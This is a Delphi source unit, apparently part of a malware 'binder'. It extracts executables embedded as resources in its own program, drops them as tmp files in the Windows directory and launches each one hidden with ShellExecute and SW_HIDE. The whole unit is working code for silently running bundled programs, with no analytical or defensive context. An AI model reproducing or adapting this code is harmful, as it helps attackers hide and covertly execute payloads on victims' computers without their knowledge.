unit uBinder;

interface

uses
  Windows, uUtils, ShellApi;

procedure ExecuteFiles;

implementation

function SplitBuffer(Input: String; Deliminator: String; Index: integer): String;
var
  StringLoop, StringCount: Integer;
  Buffer: String;
begin
  Buffer := '';
  if Index < 1 then Exit;
  StringCount := 0;
  StringLoop := 1;
  while (StringLoop <= Length(Input)) do
  begin
    if (Copy(Input, StringLoop, Length(Deliminator)) = Deliminator) then
    begin
      Inc(StringLoop, Length(Deliminator) - 1);
      Inc(StringCount);
      if StringCount = Index then
      begin
        Result := Buffer;
        Exit;
      end else
        Buffer := '';
    end else
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    Inc(StringLoop, 1);
  end;
  Inc(StringCount);
  if StringCount < Index then Buffer := '';
  Result := Buffer;
end;

function ReadRes(TRes :LPTSTR; NameRes :String) :String;
var
  hRes    :THANDLE;
  hReturn :THANDLE;
  sRes    :DWORD;
  pRes    :PChar;
  Res     :String;
begin
  hRes := FindResource(0, PChar(NameRes), TRes);
  hReturn := LoadResource(0, hRes);
  sRes := SizeofResource(0, hRes);
  pRes := LockResource(hReturn);
  SetString(Res, pRes, sRes);
  Result := Res;
  FreeResource(hReturn);
end;

procedure ExecuteFiles;
var
  Buffer    :String;
  Number    :String;
  sBuffer   :String;
  i         :Integer;
  F         :TextFile;
  NameFile  :String;
begin
  Buffer := ReadRes(RT_RCDATA, 'B');
  Number := ReadRes(RT_RCDATA, 'N');

  for i := 1 to StrToInt(Number) do
  begin
    sBuffer := SplitBuffer(Buffer, '<<@@>>', i);
    NameFile := Windir('tmp'+IntToStr(i)+'.exe');
    AssignFile(F, NameFile);
    Rewrite(F);
    Writeln(F, sBuffer);
    CloseFile(F);
    ShellExecute(0, 'open', PChar(NameFile), nil, nil, SW_HIDE);
  end;
end;

end.
